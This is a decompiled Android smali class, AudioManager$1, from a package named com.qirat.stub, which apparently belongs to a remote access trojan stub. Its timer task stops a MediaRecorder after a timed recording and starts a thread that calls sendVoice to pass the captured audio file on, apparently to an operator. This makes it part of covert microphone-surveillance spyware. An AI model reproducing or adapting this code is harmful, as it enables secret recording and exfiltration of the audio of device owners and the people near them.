.class Lcom/qirat/stub/AudioManager$1;
.super Ljava/util/TimerTask;
.source "AudioManager.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/qirat/stub/AudioManager;->startRecording(Landroid/content/Context;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic val$context:Landroid/content/Context;

.field final synthetic val$finalAudiofile:Ljava/io/File;


# direct methods
.method constructor <init>(Landroid/content/Context;Ljava/io/File;)V
    .locals 0

    .line 60
    iput-object p1, p0, Lcom/qirat/stub/AudioManager$1;->val$context:Landroid/content/Context;

    iput-object p2, p0, Lcom/qirat/stub/AudioManager$1;->val$finalAudiofile:Ljava/io/File;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method

.method static synthetic lambda$run$0(Landroid/content/Context;Ljava/io/File;)V
    .locals 0
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "finalAudiofile"    # Ljava/io/File;

    .line 69
    invoke-static {p0, p1}, Lcom/qirat/stub/AudioManager;->-$$Nest$smsendVoice(Landroid/content/Context;Ljava/io/File;)V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    .line 63
    const-string v0, "AudioManager"

    invoke-static {}, Lcom/qirat/stub/AudioManager;->-$$Nest$sfgetrecorder()Landroid/media/MediaRecorder;

    move-result-object v1

    if-nez v1, :cond_0

    return-void

    .line 66
    :cond_0
    const/4 v1, 0x0

    :try_start_0
    invoke-static {}, Lcom/qirat/stub/AudioManager;->-$$Nest$sfgetrecorder()Landroid/media/MediaRecorder;

    move-result-object v2

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    .line 67
    invoke-static {}, Lcom/qirat/stub/AudioManager;->-$$Nest$sfgetrecorder()Landroid/media/MediaRecorder;

    move-result-object v2

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    .line 68
    const-string v2, "Recording stopped."

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 69
    new-instance v2, Ljava/lang/Thread;

    iget-object v3, p0, Lcom/qirat/stub/AudioManager$1;->val$context:Landroid/content/Context;

    iget-object v4, p0, Lcom/qirat/stub/AudioManager$1;->val$finalAudiofile:Ljava/io/File;

    new-instance v5, Lcom/qirat/stub/AudioManager$1$$ExternalSyntheticLambda0;

    invoke-direct {v5, v3, v4}, Lcom/qirat/stub/AudioManager$1$$ExternalSyntheticLambda0;-><init>(Landroid/content/Context;Ljava/io/File;)V

    invoke-direct {v2, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 73
    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_1

    .line 70
    :catch_0
    move-exception v2

    .line 71
    .local v2, "e":Ljava/lang/Exception;
    :try_start_1
    const-string v3, "Error stopping recorder"

    invoke-static {v0, v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 73
    nop

    .end local v2    # "e":Ljava/lang/Exception;
    :goto_0
    invoke-static {v1}, Lcom/qirat/stub/AudioManager;->-$$Nest$sfputrecorder(Landroid/media/MediaRecorder;)V

    .line 74
    nop

    .line 75
    return-void

    .line 73
    :goto_1
    invoke-static {v1}, Lcom/qirat/stub/AudioManager;->-$$Nest$sfputrecorder(Landroid/media/MediaRecorder;)V

    .line 74
    throw v0
.end method
